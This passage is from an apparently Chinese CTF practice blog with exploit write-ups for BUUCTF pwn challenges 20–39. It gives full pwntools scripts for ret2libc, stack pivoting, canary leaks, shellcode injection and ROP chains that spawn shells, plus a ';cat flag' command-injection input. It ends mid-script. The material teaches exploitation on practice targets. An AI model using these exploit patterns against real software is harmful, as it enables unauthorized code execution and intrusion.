&#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,29048)def dbg():    gdb.attach(p)    pause()pop_rdi = 0x0000000000400c83puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]ret = 0x4006b9main = elf.sym[&#x27;main&#x27;]p.recvuntil(b&#x27;choice!\\n&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&#x27;encrypted\\n&#x27;)payload = b&#x27;\\x00&#x27;+b&#x27;a&#x27;*0x57+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr-libc.dump(&#x27;puts&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)p.recvuntil(b&#x27;choice!\\n&#x27;)p.sendline(b&#x27;1&#x27;)p.recvuntil(b&#x27;encrypted\\n&#x27;)payload = b&#x27;\\x00&#x27;+b&#x27;a&#x27;*0x57+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(sys)p.sendline(payload)p.interactive()\n\n20 ciscn_2019_ne_5这个题目挺有意思的\nida里看到4那个选项对应的就是GetFlag(),里面说我们输入的log就是flag，那么我们应该先选一输入system(/bin/sh),但是没找到/bin/sh，\nsystem(sh)也是可以的这份exp是直接截断了fflush，也可以用ROPgadget --binary pwn --string &quot;sh&quot;来查查，确实有一个(似乎就是这一个)\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()binsh = 0x80482E6+4\t#0x80482E6是字符串fflush，这里对它做了一个截断，留下了shsys_addr = 0x80484D0p.sendlineafter(b&#x27;password:&#x27;,b&#x27;administrator&#x27;)p.recvuntil(b&#x27;:&#x27;)p.sendline(b&#x27;1&#x27;)payload = b&#x27;a&#x27;*0x48+b&#x27;b&#x27;*0x4+p32(sys_addr)+b&#x27;a&#x27;*4+p32(binsh)p.recvuntil(b&#x27;info:&#x27;)p.sendline(payload)p.recvuntil(b&#x27;:&#x27;)p.sendline(b&#x27;4&#x27;)p.interactive()\n\n\nbuuctf刷题记录（21-40题）by Maple\n21_铁人三项（第五赛区) _2018_ropret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27252)def dbg():    gdb.attach(p)    pause()write_got = elf.got[&#x27;write&#x27;]write_plt = elf.plt[&#x27;write&#x27;]main = elf.sym[&#x27;main&#x27;]payload = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)p.sendline(payload)write_addr = u32(p.recv(4))libc  = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr-libc.dump(&#x27;write&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27;*0x88+b&#x27;b&#x27;*4+p32(sys)+p32(0)+p32(binsh)p.sendline(payload2)p.interactive()\n\n22 bjdctf_2020_babystack2看源码，发现输入长度是int型，而read读取的长度为unsigned int型，所以输入-1就可以了\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,27683)def dbg():    gdb.attach(p)    pause()p.sendline(&#x27;-1&#x27;)p.recvuntil(b&#x27;name?\\n&#x27;)payload = b&#x27;a&#x27;*0x10+b&#x27;b&#x27;*0x8+p64(0x400726)p.sendline(payload)p.interactive()\n\n23 bjdctf_2020_babyropret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26423)def dbg():    gdb.attach(p)    pause()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main=elf.sym[&#x27;main&#x27;]pop_rdi = 0x400733p.recvuntil(b&#x27;story!\\n&#x27;)payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendline(payload)puts_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr-libc.dump(&#x27;puts&#x27;)p.recvuntil(b&#x27;story!\\n&#x27;)sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8+p64(pop_rdi)+p64(binsh)+p64(sys)+p64(main)p.sendline(payload2)p.interactive()\n\n24 jarviso_fm看名字就知道是格式化字符串，x&#x3D;&#x3D;4的时候就可以getshell\n直接找到x的地址，用自带函数就行\nfrom pwn import *p = process(&#x27;./pwn&#x27;)payload = fmtstr_payload(11,&#123;0x804a02c:0x4&#125;)p.sendline(payload)p.interactive()\n\n25 jatviso_tell_me_something这道题有一点小坑,一般都是将ebp压入栈，然后将esp的值赋值给ebp，然后esp减去对应的栈空间的大小\npush\tebpmov\t\tebp, espsub\t\tesp, 18h\n\n但是这道题直接将rsp减去0x88，这里并没有把rbp压入栈，所以只需要0x88大小就可以覆盖返回地址了\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28402)def dbg():    gdb.attach(p)    pause()payload = b&#x27;a&#x27;*0x88+p64(0x400620)p.recvuntil(&#x27;:&#x27;)p.sendline(payload)p.interactive()\n\n26 ciscn_2019_es_2发现溢出只有八字节，需要栈迁移\n我觉得这位师傅讲的不错，ciscn_2019_es_2\nfrom pwn import * context.terminal = [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]context.log_level=&#x27;debug&#x27;p=remote(&#x27;node5.buuoj.cn&#x27;,25052)#p=process(&quot;./pwn&quot;)elf = ELF(&#x27;./pwn&#x27;)sys_addr=elf.sym[&#x27;system&#x27;]leave_ret=0x080484b8p.recvuntil(&quot;name?\\n&quot;)payload1= 0x20*&quot;a&quot;+&quot;b&quot;*0x8p.send(payload1)p.recvuntil(&quot;b&quot;*0x8)ebp_addr=u32(p.recv(4))log.info(&#x27;ebp:&#x27;+hex(ebp_addr))payload2 = (b&quot;aaaa&quot;+p32(sys_addr)+b&#x27;aaaa&#x27;+p32(ebp_addr-0x28)+b&#x27;/bin/sh&#x27;).ljust(0x28,b&#x27;\\x00&#x27;)+p32(ebp_addr-0x38) + p32(leave_ret)p.send(payload2)p.interactive()\n\n栈迁移vul函数看一下\nint vul()&#123;  char s[40]; // [esp+0h] [ebp-28h] BYREF  memset(s, 0, 0x20u);  read(0, s, 0x30u);  printf(&quot;Hello, %s\\n&quot;, s);  read(0, s, 0x30u);  return printf(&quot;Hello, %s\\n&quot;, s);&#125;\n\n可以看到read大小为0x30，但是s变量和ebp的距离是0x28。八字节的溢出只够覆盖ebp和ret，不可以做到直接修改hack函数里system的参数。所以我们利用leave_ret挟持esp进行栈迁移\n若无限制，构造的栈长这样：\n\n\n\n\n&#x2F;bin&#x2F;sh\n\n\n\n\n&#x2F;bin&#x2F;sh_addr\n\n\n\n0xdeadbeef\n\n\nreturn\nsystem_addr\n\n\nebp\naaaa\n\n\ns\n垃圾数据\n\n\nesp\n\n\n\n但是有限制，所以通过leave转移到别处，因此将ebp的内容改为s的地址，return改为leave的地址\n执行两次leave之后栈的样子\n\n\n\nreturn\nleave_ret_addr\n\n\n\nebp\ns_addr\n\n\n\n\n\n\nesp\n\n\n\ns\n垃圾数据\n\n\n一般leave命令后面都会跟着ret命令，也是必须要有的。此处如果继续执行ret命令就会返回到esp所指向内容填写的地址，那么接下来就很好办了，我们构造栈的内容\n\n\n\nreturn\nleave_ret_addr\n\n\n\nebp\naaaa\n\n\n\n\n\n\n\n&#x2F;bin&#x2F;sh\n\n\n\n&#x2F;bin&#x2F;sh_addr\n\n\n\n0xdeadbeef\n\n\nesp\nsystem_addr\n\n\ns\n垃圾数据\n\n\n当然此处我们还有一个问题就是’&#x2F;bin&#x2F;sh’的地址我们不知道。我们可以通过泄露原来ebp的值来确定，我们将此地址叫做addr，以免和ebp寄存器混淆\nint vul()&#123;    char s[40]; //\t[esp+0h][ebp-28h]BYREF        memset(s, 0x20u);    read(0, s, 0x30u);    printf(&quot;Hello, %s\\n&quot;, s);    read(0, s, 0x30u);    return printf(&quot;Hello, %s\\n&quot;, s);&#125;\n\n可以看到有一个printf函数\nprintf函数会打印s字符串，且遇到0就会停止打印，所以如果我们将addr之前的内容全部填充不为0的字符，就能将addr打印出来，我们通过地址再计算出addr到s的距离，我们就可以通过addr来表示/bin/sh所在的地址了。\n我们先通过第一个read传入payload，然后通过printf打印出addr的值,然后通过第二个read函数构造栈转移，执行systeam(&#39;/bin/sh&#39;)\n27 HarekazeCTF2019 baby_rop2ret2libc，但是用printf输出read函数的地址\nfrom pwn import *from LibcSearcher import LibcSearcher#p=process(&#x27;./pwn&#x27;)p=remote(&#x27;node5.buuoj.cn&#x27;,25118)elf=ELF(&#x27;./pwn&#x27;)read_got=elf.got[&#x27;read&#x27;]printf_plt=elf.plt[&#x27;printf&#x27;]main_addr=elf.sym[&#x27;main&#x27;]format_addr=0x400770\t# 原本输出字符串的地址pop_rdi = 0x400733pop_rsi_r15 = 0x400731payload=b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*0x8\t# 设置溢出覆盖返回地址payload+=p64(pop_rdi)+p64(format_addr)\t# pop_rdi弹入原本字符串payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)# ret到pop_rsi_r15，将read的got表地址弹入rsi，随便一个东西弹入r15payload+=p64(printf_plt)+p64(main_addr)# ret到printf的plt表地址，也就是调用plt，然后返回mainp.sendlineafter(b&quot;name?&quot;,payload)p.recvuntil(b&#x27;!\\n&#x27;)read_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&quot;read&quot;,read_addr)libc_base=read_addr-libc.dump(&#x27;read&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys_addr=libc_base+libc.dump(&quot;system&quot;)binsh_addr=libc_base+libc.dump(&quot;str_bin_sh&quot;)payload2=b&#x27;a&#x27;*40+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(0)p.sendline(payload2)p.interactive()\n\n这道题远程直接cat flag不能用，先find -name &quot;flag&quot;找到flag放在了./home/babyrop2/flag里，再cat\n28 picoctf_2018_rop chain很简单的溢出、改数据，拿flag\n注意里面这一句\nif (win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827)\n\n是win1和win2,a1和-559039827,得到的结果再&amp;&amp;\nfrom pwn import *#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26736)win1_addr = 0x80485CBwin2_addr = 0x80485D8flag = 0x804862Bpop_ebp = 0x80485d6payload = b&#x27;a&#x27;*0x18+b&#x27;b&#x27;*0x4+p32(win1_addr)+p32(win2_addr)+p32(flag)+p32(0xBAAAAAAD)+p32(0xDEADBAAD)# 先返回到win1使得win1 = 1# 然后返回win2，因为要与ebp+8比较，所以中间先加一个flag_addr# 比较好了直接返回到flag_addr# 然后与ebp+8进行比较，正好夹了一个0xBAAAAAADp.sendline(payload)p.interactive()\n\n29 pwn2_sctf_2016先输入一个负值就可以溢出了，跟正常libc没区别，就是我的LibcSearcher没找到对应的libc，看网上师傅的博客有说选13，但是我的只显示到9\n破案了，LibcSearcher会随机roll，看运气(有点过于艺术了)\nroll了半个小时，靶机都过期了，算了，本地过了就行了，本地选5\nfrom pwn import *from LibcSearcher import *from time import sleepcontext(os=&#x27;linux&#x27;, arch=&#x27;arm64&#x27;, log_level=&#x27;debug&#x27;)r = remote(&quot;node5.buuoj.cn&quot;,26858)elf = ELF(&#x27;./pwn&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]start_addr = elf.sym[&#x27;main&#x27;]r.recvuntil(&#x27;read?&#x27;)r.sendline(&#x27;-1&#x27;)r.recvuntil(&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(start_addr) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)libc_base = printf_addr-libc.dump(&#x27;printf&#x27;)system_addr = base+libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(&#x27;read?&#x27;)r.sendline(&#x27;-1&#x27;)r.recvuntil(&quot;data!\\n&quot;)payload = b&#x27;a&#x27;*(0x2c+4)+p32(system_addr)+p32(start_addr)+p32(bin_sh)r.sendline(payload)r.interactive()\n\n30 jarvisoj_level3ret2libc\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc-2.19.so&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,28662)def dbg():    gdb.attach(p)    pause()write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]main = elf.sym[&#x27;main&#x27;]payload = b&#x27;b&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)p.recvuntil(&#x27;Input:\\n&#x27;)p.sendline(payload)write_addr = u32(p.recv(4))libc = LibcSearcher(&#x27;write&#x27;,write_addr)libc_base = write_addr-libc.dump(&#x27;write&#x27;)log.info(&quot;libc_base:&quot;+hex(libc_base))sys = libc_base+libc.dump(&#x27;system&#x27;)binsh = libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;b&#x27;*0x88+b&#x27;b&#x27;*0x4+p32(sys)+p32(0)+p32(binsh)p.sendline(payload)p.interactive()\n\n31 ciscn_2019_s_3施工中……\n32 wustctf2020_getshellret2text\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,25069)def dbg():    gdb.attach(p)    pause()payload = b&#x27;b&#x27;*0x18+b&#x27;b&#x27;*0x4+p32(0x8048524)p.sendline(payload)p.interactive()\n\n33 ez_pz_hackover_2016 (动态调试入门)一道很好的动态调试入门题\n检查保护\n[*] &#x27;/home/pwn/pwn/buuctf/33/pwn&#x27;    Arch:       i386-32-little    RELRO:      Full RELRO    Stack:      No canary found    NX:         NX unknown - GNU_STACK missing    PIE:        No PIE (0x8048000)    Stack:      Executable    RWX:        Has RWX segments    Stripped:   No\n\n保护全关，有可读可写可执行段，可能是shellcode\n看下题目\n\nmemchr函数在网上搜索一下就好，这里不做详细介绍，主要是看到最后有一个比较，如果在\\n之前为crasheme，则可以进入vuln函数\n\n明显的溢出漏洞，dest仅有0x32字节，但是可以读入0x400字节，往里面写入shellcode\n思路\n往s里写入shllcode，执行vuln函数后让dest溢出，将返回地址修改为shellcode的地址\n实施\n但是dest是栈上的数据，一般情况下我们是找不到我们写入的地址的，那就没办法执行shellcode的地址。\n执行一次程序可以发现其实程序一开始就把我们输入的地址给我们了\nprintf(&quot;Yippie, lets crash: %p\\n&quot;, s);\n\n那么我们算出shellcode和我们输入的起始位置的偏移，就可以得到shellcode的地址\n先写一个测试脚本\nfrom pwn import *context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()p=process(&#x27;./pwn&#x27;)context.log_level=&#x27;debug&#x27;gdb.attach(p,&#x27;b *0x8048600&#x27;)#利用gdb动调，在0x8048600处下了个断点p.recvuntil(&#x27;crash: &#x27;)stack=int(p.recv(10),16)print (hex(stack))payload=&#x27;crashme\\x00&#x27;+&#x27;aaaaaa&#x27;#前面的crashme\\x00绕过if判断      #后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址pause()p.sendline(payload)pause()\n\n0x8048600是一个nop指令的地址，在这里下一个断点，方便调试\n\n这里输入地址的结尾是abc\n按c执行下一步，然后输入stack 50看一下栈布局\n\n解决一下shellcode在栈上的位置（填充多少数据合适）\n可以看到我们输入的crashme有一部分在距离esp0x24处，因为没有对齐的原因，cr在上面一行，对应0x63 0x72(小端序)\n然后ebp在0x38处，我们输入的参数0x22处（虽然左边标的是0x20，但是有两个字节不是我们输入的，真正输入的是0x72 0x63)，所以ebp距离我们输入点的距离是0x38-0x22=0x16，而shellcode是写在ebp后面的，也就是0x16+0x4的地方\npayload = b&#x27;crashme\\x00&#x27;+b&#x27;a&#x27;*(0x16-8+4)+p32(addr)\n\n\ncrashme\\x00占8个字节减去，ebp占4个字节要覆盖\n\n解决shllcode的地址问题\n上面已经将我们的输入地址打印出来了（结尾是abc，在ebp下面）\n既然我们只有一次输入机会，那么我们构造完返回地址之后直接跟着shellcode好了，所以直接把地址返回到ebp+8的位置就行\n0xfff9eabc-0xfff9eaa0=0x1c，所以最终地址偏移为0x1c\n最后得到exp\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()#elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)def dbg():    gdb.attach(p)    pause()p=remote(&#x27;node5.buuoj.cn&#x27;,26858)p.recvuntil(&#x27;crash: &#x27;)stack_addr=int(p.recv(10),16)shellcode=asm(shellcraft.sh())payload=b&#x27;crashme\\x00&#x27;+b&#x27;a&#x27;*(0x16-8+4)+p32(stack_addr-0x1c)+shellcodep.sendline(payload)p.interactive()\n\n\n\n34 jarvisoj_level3_x6464位的***ret2libc***从栈传参变成了寄存器传参\nfrom pwn import *from LibcSearcher import *p = remote(&#x27;node5.buuoj.cn&#x27;,28910)#p=process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)rdi_add = 0x4006b3rsir15_add = 0x4006b1write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]vul_add = elf.symbols[&#x27;vulnerable_function&#x27;]payload = b&#x27;a&#x27;*0x80 + b&#x27;a&#x27;*0x8payload1=payload+p64(rdi_add)+p64(0x1)+p64(rsir15_add)+p64(write_got)+b&#x27;deadbeef&#x27;+p64(write_plt)+p64(vul_add)p.recvuntil(&quot;Input:\\n&quot;)p.sendline(payload1)write_addr = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;write&#x27;,write_addr)libc_base=write_addr-libc.dump(&#x27;write&#x27;)sys_add = libc_base + libc.dump(&#x27;system&#x27;)binsh_add =libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload2 = payload + p64(rdi_add) + p64(binsh_add) + p64(sys_add)p.sendline(payload2)p.interactive()\n\n35 mrctf2020_shellcoderet2shellcode\nida没法反编译了，这次读汇编（其实只要传入shellcode就行）\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26947)def dbg():    gdb.attach(p)    pause()shellcode = asm(shellcraft.sh())p.sendline(shellcode)p.interactive()\n\n接下来看一下汇编\n\nbuf= byte ptr -410h\t;buf 表示相对于基指针 rbp 偏移量为 -410h 的一个字节内存位置var_4= dword ptr -4\t;var_4 表示相对于基指针 rbp 偏移量为 -4 的一个双字（32 位，4 字节）内存位置\n\npush    rbpmov     rbp, rspsub     rsp, 410h\n\n这里是开辟0x410字节空间的栈\n中间一部分应该是缓冲区设置，没看懂，但也不需要看懂，跳过\nlea     rdi, s          ; &quot;Show me your magic!&quot;call    _puts\n\n\nlea rdi, s：将字符串 &quot;Show me your magic!&quot; 的地址加载到 rdi 寄存器中，作为 _puts 函数的参数。\n\ncall _puts：调用 _puts 函数输出字符串，并自动添加换行符。\n\n\nlea     rax, [rbp+buf]mov     edx, 400h       ; nbytesmov     rsi, rax        ; bufmov     edi, 0          ; fdmov     eax, 0call    _read\n\n\nlea rax, [rbp+buf]：计算相对于基指针 rbp 偏移量为 -410h 的内存地址，并将其加载到 rax 寄存器中，作为读取数据的缓冲区地址。\nmov edx, 400h：将读取的最大字节数 400h 加载到 edx 寄存器中。\nmov rsi, rax：将缓冲区地址传递给 _read 函数的第二个参数。\nmov edi, 0：将文件描述符 0（标准输入）传递给 _read 函数的第一个参数。\nmov eax, 0：将返回值寄存器 eax 清零。\ncall _read：调用 _read 函数从标准输入读取最多 400h 字节的数据到缓冲区中。\n\nmov     [rbp+var_4], eaxcmp     [rbp+var_4], 0jg      short loc_11D6\n\n\nmov [rbp+var_4], eax：将 _read 函数的返回值（实际读取的字节数）保存到相对于基指针 rbp 偏移量为 -4 的内存位置（var_4)\ncmp [rbp+var_4], 0：比较实际读取的字节数是否为 0，用于后续的条件判断。\njg基于前面 cmp [rbp+var_4], 0 指令设置的标志位进行判断。[rbp+var_4] 中存储的是 _read 函数实际读取的字节数，如果这个值大于 0，程序就会跳转到 loc_11D6 标签处继续执行；如果不满足条件（即读取的字节数小于等于 0），则继续顺序执行下一条指令。\n\n若失败，即无读入（左边）\nmov     eax, 0jmp     short locret_11E4\n\n\nmov eax, 0：将寄存器 eax 赋值为 0。在很多系统调用和函数返回中，eax 通常用于存储返回值，这里将其置为 0 表示程序以正常状态退出或者操作失败的返回码。\njmp short locret_11E4：无条件跳转到 locret_11E4 标签处，跳过后续代码直接进入函数返回流程。\n\n若成功，即有读入（右边）\nloc_11D6:                               ; CODE XREF: main+78↑jlea     rax, [rbp+buf]call    raxmov     eax, 0\n\n\nloc_11D6：这是一个代码标签，当满足 jg 跳转条件时会跳转到这里。\nlea rax, [rbp+buf]：lea 是加载有效地址指令，这里将相对于基指针 rbp 偏移量为 -410h（前面定义的 buf）的内存地址加载到 rax 寄存器中。\ncall rax：这是一个间接调用指令，它会将程序控制权转移到 rax 寄存器所指向的地址处执行代码。\nmov eax, 0：同样将寄存器 eax 赋值为 0，可能用于表示函数的正常返回状态。\n\n综上，可以很清楚的发现，直接往buf里面写入代码之后函数就会直接执行buf里的代码，所以直接注入shellcode就行\n36 bjdctf_2020_babyrop2格式化字符串+canary绕过+ret2libc\n我记得写过canary绕过的wp，忘了在哪了，再写一份吧\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#p = process(&#x27;./pwn&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;,26391)def dbg():    gdb.attach(p)    pause()put_plt=elf.plt[&#x27;puts&#x27;]put_got=elf.got[&#x27;puts&#x27;]pop_rdi=0x0400993main_addr=elf.symbols[&#x27;main&#x27;]vuln_addr=0x400887p.sendlineafter(&#x27;help u!\\n&#x27;,b&#x27;%7$p&#x27;)p.recvuntil(b&#x27;0x&#x27;)canary = int(p.recv(16),16)payload = p64(canary)payload = payload.rjust(0x20,b&#x27;a&#x27;)+b&#x27;a&#x27;*8+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(vuln_addr)p.sendlineafter(b&#x27;story!\\n&#x27;,payload)put_addr=u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc=LibcSearcher(&#x27;puts&#x27;,put_addr)libcbase=put_addr-libc.dump(&quot;puts&quot;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload = p64(canary)payload = payload.rjust(0x20,b&#x27;a&#x27;)+b&#x27;a&#x27;*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)p.sendlineafter(&#x27;story!\\n&#x27;,payload)p.interactive()\n\n审题\n\nchecksec一下，发现开启了NX和canary\n\nida看一下，直接去gift()函数\n\n\n\nv2就是canary值（一会后面解释canary保护），距离rbp为0x-8\n\n这里还读入了format函数，格式化字符串试试，看看我们的第几个输入可以被解析为格式化字符\n\n我是输入aa%n$p,一个个试过去，看看哪个对应出61，最后发现输入aa%6$p的时候输出为aa0x702436256161，说明：第六个参数可以被解析成格式化字符串\n\n接下来动态调试一下看看canary的值是哪个（不出意外就是后一个）\n\n在printf处下断点，然后run运行到断点处，输入aa，然后查看栈结构\n\ncanary值（v2)在rbp-8处，而我们输入的aa在它的上面，所以canary值可以用%7$p打印出来\n\n\n\n\n\ncanary保护简单来说，就是程序在开始运行前从一块只读数据中读出来一个随机数存在栈底（rbp上面一个），然后返回的时候看看栈底这个数变了没，变了就说明被栈溢出了，程序中断。\n而想要绕过也很简单，只需要我们将canary的值读出来，在构造payload的时候放在它本来就该在的位置就好了\npayload = p64(canary)\t# 写入canary值payload = payload.rjust(0x20,b&#x27;a&#x27;)\t# buf距离rbp为0x20，所以直接将canary和垃圾数据一起填满这32字节\n\n后面3就是正常的ret2libc了，都写烂了要，不说了\n37 babyheap_0ctf_2017施工施工，heap先等等\n38 bjdctf_2020_router考察linux下的命令机制\n命令一；命令二这样的格式会执行两种指令\nida里面一看，system(dest),前面还有一段将buf拼接到dest后面，那直接输入;cat flag秒了，exp都不用。直接nc\n39 inndy_roprop一把梭*\n打开ida一看，这么多函数，这么明显的溢出，直接ropchain一把梭\nROPgadget --binary pwn --ropchain直接可以生成rop链，把溢出填充好就直接用就行\nfrom pwn import *from LibcSearcher import LibcSearcherfrom ctypes import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)context.terminal = &#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;.split()elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./libc.so.6&quot;)#r = process(&#x27;./pwn&#x27;)r = remote(&#x27;node5.buuoj.cn&#x27;,29636)def dbg():    gdb.attach(r)    pause()#!/usr/bin/env python3# execve generated by ROPgadgetfrom struct import pack# Padding goes herep = b&#x27;a&#x27;*0xC+b&#x27;b&#x27;*0x4p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805466b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8016) # pop eax ; retp += b&#x27;//sh&#x27;p += 